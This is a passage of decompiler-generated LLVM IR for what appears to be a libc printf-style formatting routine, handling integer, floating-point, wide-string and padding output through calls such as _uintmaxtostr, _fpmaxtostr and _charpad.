  store i32 %v4_136c4, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_136a0
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_136a0, %bb145
  %storemerge = phi i32 [ %v10_136d4, %bb145 ], [ %v7_136d0, %dec_label_pc_136a0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_136fc195, label %dec_label_pc_136e0, label %dec_label_pc_13700

dec_label_pc_136e0:                               ; preds = %bb146, %dec_label_pc_136e0
  %v5_136ec197 = phi i32 [ %v5_136ec, %dec_label_pc_136e0 ], [ %v2_136e8, %bb146 ]
  %v0_136e0196 = phi i32 [ %v1_136e4, %dec_label_pc_136e0 ], [ %storemerge, %bb146 ]
  %v2_136e0 = add i32 %v5_136ec197, -32
  %v3_136e0 = inttoptr i32 %v2_136e0 to i32*
  store i32 %v0_136e0196, i32* %v3_136e0, align 4
  %v0_136e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_136e4 = add i32 %v0_136e4, 8
  store i32 %v1_136e4, i32* %r0.global-to-local, align 4
  %v1_136ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_136ec = mul i32 %v1_136ec.pre, 4
  %v5_136ec = add i32 %v4_136ec, %v2_136e8
  %v1_136f8 = add i32 %v1_136ec.pre, 1
  store i32 %v1_136f8, i32* %r2.global-to-local, align 4
  %v5_136fc = icmp slt i32 %v1_136ec.pre, %tmp105
  br i1 %v5_136fc, label %dec_label_pc_136e0, label %dec_label_pc_13700

dec_label_pc_13700:                               ; preds = %dec_label_pc_136e0, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_13704, label %dec_label_pc_1370c, label %dec_label_pc_13730

dec_label_pc_1370c:                               ; preds = %dec_label_pc_13700
  %v3_1370c = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_13b00, i32* @ip, align 4
  %v1_13718 = inttoptr i32 %v3_1370c to i32*
  %v2_13718 = load i32, i32* %v1_13718, align 4
  store i32 %v2_13718, i32* %r0.global-to-local, align 4
  %v1_1371c = and i32 %v0_13768, 3840
  store i32 %v1_13b00, i32* %r2.global-to-local, align 4
  %v3_13724 = ashr i32 %v1_13b00, 31
  %v4_13728 = inttoptr i32 %v2_13718 to i16*
  %v5_13728 = call i32 @_store_inttype(i16* %v4_13728, i32 %v1_1371c, i32 %v1_13b00, i32 %v3_13724)
  store i32 %v5_13728, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13730:                               ; preds = %dec_label_pc_13700
  br i1 %tmp207, label %dec_label_pc_138cc, label %dec_label_pc_13738

dec_label_pc_13738:                               ; preds = %dec_label_pc_13730
  %v3_13748 = load i8, i8* %v2_13748, align 1
  %v4_13748 = zext i8 %v3_13748 to i32
  %v7_1374c = icmp eq i8 %v3_13748, 10
  br i1 %v7_1374c, label %dec_label_pc_13758, label %bb147

bb147:                                            ; preds = %dec_label_pc_13738
  br label %bb151

dec_label_pc_13758:                               ; preds = %dec_label_pc_13738
  %v1_13768 = and i32 %v0_13768, 64
  %v2_13768 = icmp eq i32 %v1_13768, 0
  br i1 %v2_13768, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_13758
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_13758, %bb150
  br i1 %v3_13774, label %.thread, label %dec_label_pc_1377c

.thread:                                          ; preds = %bb151
  %v5_13774 = sub nsw i32 0, %v4_13748
  br label %dec_label_pc_13794

dec_label_pc_1377c:                               ; preds = %bb151
  br i1 %v7_13858, label %bb152, label %dec_label_pc_13788

bb152:                                            ; preds = %dec_label_pc_1377c
  br label %dec_label_pc_13794

dec_label_pc_13788:                               ; preds = %dec_label_pc_1377c
  br i1 %v7_137a8, label %dec_label_pc_13798, label %dec_label_pc_13794

dec_label_pc_13794:                               ; preds = %.thread, %bb152, %dec_label_pc_13788
  %v0_137c081 = phi i32 [ %v5_13774, %.thread ], [ %v4_13748, %bb152 ], [ %v4_13748, %dec_label_pc_13788 ]
  br label %dec_label_pc_13798

dec_label_pc_13798:                               ; preds = %dec_label_pc_13788, %dec_label_pc_13794
  %v0_137c080 = phi i32 [ %v0_137c081, %dec_label_pc_13794 ], [ %v4_13748, %dec_label_pc_13788 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_13794 ], [ 6, %dec_label_pc_13788 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_13798 = load i32, i32* %stack_var_-348, align 4
  %v1_1379c = icmp slt i32 %v3_13798, 0
  %v7_137a0. = select i1 %v1_1379c, i32 %v7_137a0, i32 32
  store i32 %v7_137a0., i32* @sb, align 4
  br i1 %v7_137a8, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_13798
  store i32 %v2_136e8, i32* %r2.global-to-local, align 4
  %v2_137b0 = load i32, i32* @ip, align 4
  %v5_137b0 = mul i32 %v2_137b0, 4
  %v6_137b0 = add i32 %v5_137b0, %v2_136e8
  %v2_137b4 = add i32 %v6_137b0, -276
  %v3_137b4 = inttoptr i32 %v2_137b4 to i32*
  %v4_137b4 = load i32, i32* %v3_137b4, align 4
  %v2_137bc = and i32 %v4_137b4, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_13798, %.thread15
  %storemerge93 = phi i32 [ %v2_137bc, %.thread15 ], [ 1024, %dec_label_pc_13798 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_137c080, i32* @r2, align 4
  %v3_137c4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_137c4, i32* @r1, align 4
  %v0_137c8 = call i32 @_load_inttype()
  store i32 %v0_137c8, i32* @r2, align 4
  %v0_137d4 = load i32, i32* @r1, align 4
  store i32 %v0_137d4, i32* @r3, align 4
  store i32 %v2_137d8, i32* %r0.global-to-local, align 4
  %v2_137e0 = call i32 @_uintmaxtostr(i8* %v1_137e0)
  store i32 %v2_137e0, i32* %r0.global-to-local, align 4
  store i32 %v2_137e0, i32* @r4, align 4
  br i1 %v3_137f0, label %bb160, label %dec_label_pc_137f4

dec_label_pc_137f4:                               ; preds = %bb157
  %v3_137e0 = inttoptr i32 %v2_137e0 to i8*
  %v3_137f4 = load i8, i8* %v3_137e0, align 1
  %v7_137f8 = icmp eq i8 %v3_137f4, 45
  %v2_13800 = or i32 %v0_13768, 2
  %v2_13800.stack_var_-336.0 = select i1 %v7_137f8, i32 %v2_13800, i32 %v0_13768
  br i1 %v7_137f8, label %.thread17, label %dec_label_pc_13814

.thread17:                                        ; preds = %dec_label_pc_137f4
  %v3_13804 = add i32 %v2_137e0, 1
  store i32 %v3_13804, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_13814:                               ; preds = %dec_label_pc_137f4
  %v1_13814 = and i32 %v2_13800.stack_var_-336.0, 2
  %v2_13814 = icmp eq i32 %v1_13814, 0
  br i1 %v2_13814, label %dec_label_pc_13820, label %bb158

bb158:                                            ; preds = %dec_label_pc_13814
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_13820:                               ; preds = %dec_label_pc_13814
  %v1_13820 = urem i32 %v2_13800.stack_var_-336.0, 2
  %v2_13820 = icmp eq i32 %v1_13820, 0
  br i1 %v2_13820, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_13820
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_13820, %bb159
  %v0_1387c = phi i32 [ %v2_137e0, %bb157 ], [ %v3_13804, %.thread17 ], [ %v2_137e0, %dec_label_pc_13820 ], [ %v2_137e0, %bb159 ], [ %v2_137e0, %bb158 ]
  %v0_13838 = phi i32 [ %v0_13768, %bb157 ], [ %v2_13800, %.thread17 ], [ %v0_13768, %dec_label_pc_13820 ], [ %v0_13768, %bb159 ], [ %v0_13768, %bb158 ]
  %v3_13828 = load i32, i32* %stack_var_-348, align 4
  %v1_13830 = icmp slt i32 %v3_13828, 0
  br i1 %v1_13830, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_13828, %bb160 ]
  %v0_13860 = phi i32 [ 1, %bb161 ], [ %v3_13828, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_13838 = and i32 %v0_13838, 16
  %v2_13838 = icmp eq i32 %v1_13838, 0
  %v2_13844 = sub i32 %v2_137d8, %v0_1387c
  store i32 %v2_13844, i32* @r5, align 4
  br i1 %v2_13838, label %bb169, label %dec_label_pc_1384c

dec_label_pc_1384c:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_1384c
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_1384c, %bb163
  br i1 %v7_13858, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_13860, %v2_13844
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_13864, label %dec_label_pc_1386c, label %bb169

dec_label_pc_1386c:                               ; preds = %bb167
  %v1_1386c = inttoptr i32 %v0_1387c to i8*
  %v2_1386c = load i8, i8* %v1_1386c, align 1
  %v7_13870 = icmp eq i8 %v2_1386c, 48
  br i1 %v7_13870, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_1386c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_1386c
  %v2_13878 = add i32 %v2_13844, 1
  store i32 %v2_13878, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_138bc = phi i32 [ %v0_13860, %bb167 ], [ %v0_13860, %bb162 ], [ 1, %bb168 ], [ %v2_13878, %.thread24 ], [ %v0_13860, %bb166 ]
  %v1_1387c = inttoptr i32 %v0_1387c to i8*
  %v2_1387c = load i8, i8* %v1_1387c, align 1
  %v7_13880 = icmp eq i8 %v2_1387c, 48
  br i1 %v7_13880, label %dec_label_pc_13888, label %dec_label_pc_138b8

dec_label_pc_13888:                               ; preds = %bb169
  %v0_1388c = load i32, i32* @r6, align 4
  %v7_13890 = icmp slt i32 %v0_1388c, 6
  br i1 %v7_13890, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_13888
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_13888, %bb170
  br i1 %v7_137a8, label %.thread27, label %dec_label_pc_138ac

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -37076), i32* @r4, align 4
  br label %dec_label_pc_138c4

dec_label_pc_138ac:                               ; preds = %bb171
  %v2_138ac = icmp eq i32 %v5_138bc, 0
  br i1 %v2_138ac, label %bb172, label %dec_label_pc_138b8

bb172:                                            ; preds = %dec_label_pc_138ac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_138c4

dec_label_pc_138b8:                               ; preds = %dec_label_pc_138ac, %bb169
  %v2_138b8 = sub i32 %v5_138bc, %v2_13844
  %tmp211 = icmp ugt i32 %v5_138bc, %v2_13844
  br i1 %tmp211, label %.thread85, label %dec_label_pc_138c4

.thread85:                                        ; preds = %dec_label_pc_138b8
  store i32 %v2_138b8, i32* @r8, align 4
  br label %dec_label_pc_13ad0thread-pre-split

dec_label_pc_138c4:                               ; preds = %dec_label_pc_138b8, %.thread27, %bb172
  %v1_13ad4.pre205 = phi i32 [ %v2_13844, %dec_label_pc_138b8 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_13ad0thread-pre-split

dec_label_pc_138cc:                               ; preds = %dec_label_pc_13730
  br i1 %tmp208, label %dec_label_pc_1390c, label %dec_label_pc_138d4

dec_label_pc_138d4:                               ; preds = %dec_label_pc_138cc
  %v3_138e4 = load i32, i32* %stack_var_-72, align 4
  %v0_138e8 = load i32, i32* @fp, align 4
  store i32 %v0_138e8, i32* %r0.global-to-local, align 4
  %v1_138ec = inttoptr i32 %v3_138e4 to i32*
  %v2_138ec = load i32, i32* %v1_138ec, align 4
  store i32 %v2_138ec, i32* %r2.global-to-local, align 4
  %v3_138ec = add i32 %v3_138e4, 4
  %v4_138ec = inttoptr i32 %v3_138ec to i32*
  %v5_138ec = load i32, i32* %v4_138ec, align 4
  %v8_138f0 = call i32 @_fpmaxtostr(i32 %v0_138e8, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -89992) to i64) to double), i32 %v2_138ec, i32 %v5_138ec, i32 %v2_13a80, i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -89992))
  store i32 %v8_138f0, i32* %r0.global-to-local, align 4
  %v1_138f4 = icmp slt i32 %v8_138f0, 0
  br i1 %v1_138f4, label %dec_label_pc_13c28, label %dec_label_pc_138fc

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138d4
  %v2_13900 = add i32 %v8_138f0, %v1_13b00
  store i32 %v2_13900, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_1390c:                               ; preds = %dec_label_pc_138cc
  br i1 %v3_13910, label %dec_label_pc_13994, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_1390c
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_1391c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1391c, i32* %r0.global-to-local, align 4
  br i1 %v7_1390c, label %dec_label_pc_13924, label %dec_label_pc_1395c

dec_label_pc_13924:                               ; preds = %dec_label_pc_13914
  %v1_13924 = inttoptr i32 %v3_1391c to i32*
  %v2_13924 = load i32, i32* %v1_13924, align 4
  %v9_13928 = icmp eq i32 %v2_13924, 0
  store i32 %v2_13924, i32* %stack_var_-44, align 4
  br i1 %v9_13928, label %dec_label_pc_139d4, label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %dec_label_pc_13924
  %v3_13934 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_13938, i32* @r0, align 4
  %v4_1393c = ashr i32 %v3_13934, 31
  %v5_1393c = or i32 %v4_1393c, %v3_13934
  store i32 %v5_1393c, i32* %r2.global-to-local, align 4
  store i32 %v2_13938, i32* @r1, align 4
  %v6_13948 = call i32 @__GI_wcsrtombs(i32 %v2_13938, i32 %v2_13938, i32 %v5_1393c, i32 %v2_13944, i32 0, i32 %v2_13924)
  store i32 %v6_13948, i32* %r0.global-to-local, align 4
  %v3_1394c = icmp eq i32 %v6_13948, -1
  store i32 %v6_13948, i32* @r5, align 4
  br i1 %v3_1394c, label %dec_label_pc_13c28, label %dec_label_pc_13ac0

dec_label_pc_1395c:                               ; preds = %dec_label_pc_13914
  store i32 %v2_13a3c, i32* %r7.global-to-local, align 4
  %v1_13960 = inttoptr i32 %v3_1391c to i32*
  %v2_13960 = load i32, i32* %v1_13960, align 4
  store i32 %v2_13944, i32* %r2.global-to-local, align 4
  store i32 %v2_13a3c, i32* %r0.global-to-local, align 4
  %v5_1396c = call i32 @__GI_wcrtomb(i32 %v2_13a3c, i32 %v2_13960, i32 %v2_13944, i32 %tmp105, i32 0)
  store i32 %v5_1396c, i32* %r0.global-to-local, align 4
  %v7_13970 = icmp eq i32 %v5_1396c, -1
  store i32 %v5_1396c, i32* @r5, align 4
  br i1 %v7_13970, label %dec_label_pc_13c28, label %dec_label_pc_1397c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_1395c
  %v0_1397c = load i32, i32* @sl, align 4
  store i32 %v0_1397c, i32* @r8, align 4
  store i32 %v2_13a3c, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_1398c = trunc i32 %v0_1397c to i8
  %v2_1398c = load i32, i32* %r7.global-to-local, align 4
  %v4_1398c = add i32 %v2_1398c, %v5_1396c
  %v5_1398c = inttoptr i32 %v4_1398c to i8*
  store i8 %v1_1398c, i8* %v5_1398c, align 1
  %v0_13ad4.pre.pre = load i32, i32* @r8, align 4
  %v1_13ad4.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13ad0thread-pre-split

dec_label_pc_13994:                               ; preds = %dec_label_pc_1390c
  br i1 %v3_13998, label %dec_label_pc_13a30, label %dec_label_pc_1399c

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13994
  %v3_1399c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1399c, i32* %r0.global-to-local, align 4
  %v1_139a4 = inttoptr i32 %v3_1399c to i32*
  %v2_139a4 = load i32, i32* %v1_139a4, align 4
  br i1 %v7_13994, label %dec_label_pc_139a4, label %dec_label_pc_13a08

dec_label_pc_139a4:                               ; preds = %dec_label_pc_1399c
  store i32 %v2_139a4, i32* @r4, align 4
  %v2_139a8 = icmp eq i32 %v2_139a4, 0
  br i1 %v2_139a8, label %dec_label_pc_139d4, label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_139a4, %dec_label_pc_13a38
  %v0_139b4 = phi i32 [ %v2_139a4, %dec_label_pc_139a4 ], [ %v3_13a48, %dec_label_pc_13a38 ]
  %v3_139b0 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_139b4, i32* %r0.global-to-local, align 4
  %v4_139b8 = ashr i32 %v3_139b0, 31
  %v5_139b8 = or i32 %v4_139b8, %v3_139b0
  %v2_139bc = inttoptr i32 %v0_139b4 to i8*
  %v3_139bc = call i32 @strnlen(i8* %v2_139bc, i32 %v5_139b8)
  store i32 %v3_139bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_139bc, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139a4, %dec_label_pc_13924
  %v3_139d4 = load i32, i32* %stack_var_-348, align 4
  %v1_139d8 = icmp slt i32 %v3_139d4, 0
  br i1 %v1_139d8, label %dec_label_pc_139f0, label %dec_label_pc_139e0

dec_label_pc_139e0:                               ; preds = %dec_label_pc_139d4
  %tmp212 = icmp ult i32 %v3_139d4, 6
  br i1 %tmp212, label %dec_label_pc_139f8, label %dec_label_pc_139f0

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139e0, %dec_label_pc_139d4
  br label %dec_label_pc_139f8

dec_label_pc_139f8:                               ; preds = %dec_label_pc_139e0, %dec_label_pc_139f0
  %storemerge97 = phi i32 [ 6, %dec_label_pc_139f0 ], [ 0, %dec_label_pc_139e0 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -37068), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13a08:                               ; preds = %dec_label_pc_1399c
  store i32 %v2_139a4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_13a3c, i32* @r4, align 4
  store i32 %v2_139a4, i32* %stack_var_-200, align 4
  br label %dec_label_pc_13ad0thread-pre-split

dec_label_pc_13a30:                               ; preds = %dec_label_pc_13994
  br i1 %v7_13a30, label %dec_label_pc_13a38, label %dec_label_pc_13a54

dec_label_pc_13a38:                               ; preds = %dec_label_pc_13a30
  %v0_13a38 = call i32 @__GI___errno_location()
  store i32 %v0_13a38, i32* %r0.global-to-local, align 4
  %v1_13a40 = inttoptr i32 %v0_13a38 to i32*
  %v2_13a40 = load i32, i32* %v1_13a40, align 4
  store i32 %v2_13a40, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_13a48 = call i32 @__GI___glibc_strerror_r(i32 %v2_13a40, i32 %v2_13a3c, i32 128)
  store i32 %v3_13a48, i32* %r0.global-to-local, align 4
  store i32 %v3_13a48, i32* @r4, align 4
  br label %dec_label_pc_139b0

dec_label_pc_13a54:                               ; preds = %dec_label_pc_13a30
  %v4_13a5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 1012) to i32*), align 4
  %v1_13a64 = add i32 %v4_13a5c, 10
  store i32 %v1_13a64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13ab0, %dec_label_pc_13a54
  %v1_13a78 = phi i32 [ %v1_13ab0, %dec_label_pc_13ab0 ], [ %v4_13a5c, %dec_label_pc_13a54 ]
  %v1_13a68 = inttoptr i32 %v1_13a78 to i8*
  %v2_13a68 = load i8, i8* %v1_13a68, align 1
  %v3_13a68 = zext i8 %v2_13a68 to i32
  store i32 %v3_13a68, i32* %r2.global-to-local, align 4
  %v9_13a70 = icmp eq i32 %v3_13a68, %tmp99
  br i1 %v9_13a70, label %dec_label_pc_13a78, label %dec_label_pc_13ab0

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a68
  %v2_13a78 = sub i32 %v1_13a78, %v4_13a5c
  %v0_13a7c = load i32, i32* @fp, align 4
  store i32 %v0_13a7c, i32* %r0.global-to-local, align 4
  store i32 %v2_13a84, i32* %r2.global-to-local, align 4
  %v4_13a8c = mul i32 %v2_13a78, 4
  %v5_13a8c = add i32 %v4_13a8c, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 26552)
  %v6_13a8c = inttoptr i32 %v5_13a8c to i32*
  %v7_13a8c = load i32, i32* %v6_13a8c, align 4
  store i32 %v7_13a8c, i32* @ip, align 4
  store i32 80536, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_13a8c)
  %v0_13a98 = load i32, i32* %r0.global-to-local, align 4
  %v1_13a98 = icmp slt i32 %v0_13a98, 0
  br i1 %v1_13a98, label %dec_label_pc_13c28, label %dec_label_pc_13aa0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13a78
  %v2_13aa4 = add i32 %v0_13a98, %v1_13b00
  br label %dec_label_pc_13c14

dec_label_pc_13ab0:                               ; preds = %dec_label_pc_13a68
  %v1_13ab0 = add i32 %v1_13a78, 1
  %v3_13ab4 = icmp ult i32 %v1_13ab0, %v1_13a64
  br i1 %v3_13ab4, label %dec_label_pc_13a68, label %dec_label_pc_13c28

dec_label_pc_13ac0:                               ; preds = %dec_label_pc_13934
  %v0_13ac0 = load i32, i32* @sl, align 4
  store i32 %v0_13ac0, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_13ac0, i32* @r4, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13ad0thread-pre-split:               ; preds = %.thread85, %dec_label_pc_138c4, %dec_label_pc_1397c, %dec_label_pc_13a08
  %v1_13ad4.pre = phi i32 [ %v1_13ad4.pre205, %dec_label_pc_138c4 ], [ %v1_13ad4.pre.pre, %dec_label_pc_1397c ], [ 1, %dec_label_pc_13a08 ], [ %v2_13844, %.thread85 ]
  %v0_13ad4.pre = phi i32 [ 0, %dec_label_pc_138c4 ], [ %v0_13ad4.pre.pre, %dec_label_pc_1397c ], [ 0, %dec_label_pc_13a08 ], [ %v2_138b8, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_13838, %dec_label_pc_138c4 ], [ %v0_13768, %dec_label_pc_1397c ], [ %v0_13768, %dec_label_pc_13a08 ], [ %v0_13838, %.thread85 ]
  %v0_13ad0.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ad0

dec_label_pc_13ad0:                               ; preds = %dec_label_pc_13ad0thread-pre-split, %dec_label_pc_139f8, %dec_label_pc_139b0, %dec_label_pc_13ac0
  %v1_13ad4 = phi i32 [ %v1_13ad4.pre, %dec_label_pc_13ad0thread-pre-split ], [ %storemerge97, %dec_label_pc_139f8 ], [ %v3_139bc, %dec_label_pc_139b0 ], [ %v6_13948, %dec_label_pc_13ac0 ]
  %v0_13ad4 = phi i32 [ %v0_13ad4.pre, %dec_label_pc_13ad0thread-pre-split ], [ 0, %dec_label_pc_139f8 ], [ 0, %dec_label_pc_139b0 ], [ %v0_13ac0, %dec_label_pc_13ac0 ]
  %v0_13adc = phi i32 [ %v0_13ad0.pr, %dec_label_pc_13ad0thread-pre-split ], [ 11, %dec_label_pc_139f8 ], [ 11, %dec_label_pc_139b0 ], [ 11, %dec_label_pc_13ac0 ]
  %v0_13b1c = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_13ad0thread-pre-split ], [ %v0_13768, %dec_label_pc_139f8 ], [ %v0_13768, %dec_label_pc_139b0 ], [ %v0_13768, %dec_label_pc_13ac0 ]
  %v7_13ad0 = icmp eq i32 %v0_13adc, 11
  %v2_13ad4 = add i32 %v1_13ad4, %v0_13ad4
  br i1 %v7_13ad0, label %dec_label_pc_13aec, label %bb173

bb173:                                            ; preds = %dec_label_pc_13ad0
  %v7_13ae4 = icmp sgt i32 %v0_13adc, 5
  %. = select i1 %v7_13ae4, i32 2, i32 1
  %v2_13ae8 = add i32 %v2_13ad4, %.
  br label %dec_label_pc_13aec

dec_label_pc_13aec:                               ; preds = %dec_label_pc_13ad0, %bb173
  %v0_13b00 = phi i32 [ %v2_13ad4, %dec_label_pc_13ad0 ], [ %v2_13ae8, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_13af0 = icmp uge i32 %tmp98, %v0_13b00
  %v9_13af0 = icmp eq i32 %tmp98, %v0_13b00
  %v2_13af4 = xor i1 %v9_13af0, true
  %v3_13af4 = and i1 %v3_13af0, %v2_13af4
  br i1 %v3_13af4, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_13aec
  %v2_13af0 = sub i32 %tmp98, %v0_13b00
  store i32 %v2_13af0, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_13aec, %bb174
  store i32 %v1_13b00, i32* %r2.global-to-local, align 4
  %v2_13afc = xor i1 %v3_13af0, true
  %v3_13afc = or i1 %v9_13af0, %v2_13afc
  br i1 %v3_13afc, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_13b04.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_13b14 = phi i32 [ %v1_13b04.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_13b00 = add i32 %v0_13b00, %v1_13b00
  %v2_13b04 = add i32 %v2_13b00, %v2_13b14
  %v0_13b10 = load i32, i32* @sb, align 4
  %v7_13b10 = icmp eq i32 %v0_13b10, 48
  br i1 %v7_13b10, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_13b14 = add i32 %v2_13b14, %v0_13ad4
  store i32 %v3_13b14, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_13b2c = phi i32 [ %v2_13b14, %bb177 ], [ 0, %bb178 ]
  %v1_13b1c = and i32 %v0_13b1c, 8
  store i32 %v1_13b1c, i32* @r7, align 4
  %v2_13b1c = icmp eq i32 %v1_13b1c, 0
  br i1 %v2_13b1c, label %dec_label_pc_13b24, label %dec_label_pc_13b40

dec_label_pc_13b24:                               ; preds = %.thread30
  %v0_13b24 = load i32, i32* @fp, align 4
  store i32 %v0_13b24, i32* %r0.global-to-local, align 4
  store i32 %v0_13b2c, i32* %r2.global-to-local, align 4
  %v4_13b30 = call i32 @_charpad(i32 %v0_13b24, i8 32, i32 %v0_13b2c)
  store i32 %v4_13b30, i32* %r0.global-to-local, align 4
  %v1_13b34 = load i32, i32* @sl, align 4
  %v9_13b34 = icmp eq i32 %v4_13b30, %v1_13b34
  br i1 %v9_13b34, label %dec_label_pc_13b3c, label %dec_label_pc_13c28

dec_label_pc_13b3c:                               ; preds = %dec_label_pc_13b24
  %v0_13b3c = load i32, i32* @r7, align 4
  store i32 %v0_13b3c, i32* @sl, align 4
  %v0_13b48.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %.thread30, %dec_label_pc_13b3c
  %v0_13b48 = phi i32 [ %v0_13adc, %.thread30 ], [ %v0_13b48.pre, %dec_label_pc_13b3c ]
  %v0_13b44 = load i32, i32* @fp, align 4
  %v2_13b48 = add i32 %v0_13b48, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -37060)
  store i32 %v2_13b48, i32* %r0.global-to-local, align 4
  %v2_13b4c = inttoptr i32 %v2_13b48 to i8*
  %v3_13b4c = call i32 @__GI_fputs_unlocked(i8* %v2_13b4c, i32 %v0_13b44)
  %v0_13b50 = load i32, i32* @fp, align 4
  store i32 %v0_13b50, i32* %r0.global-to-local, align 4
  %v0_13b58 = load i32, i32* @r8, align 4
  store i32 %v0_13b58, i32* %r2.global-to-local, align 4
  %v4_13b5c = call i32 @_charpad(i32 %v0_13b50, i8 48, i32 %v0_13b58)
  store i32 %v4_13b5c, i32* %r0.global-to-local, align 4
  %v1_13b60 = load i32, i32* @r8, align 4
  %v9_13b60 = icmp eq i32 %v4_13b5c, %v1_13b60
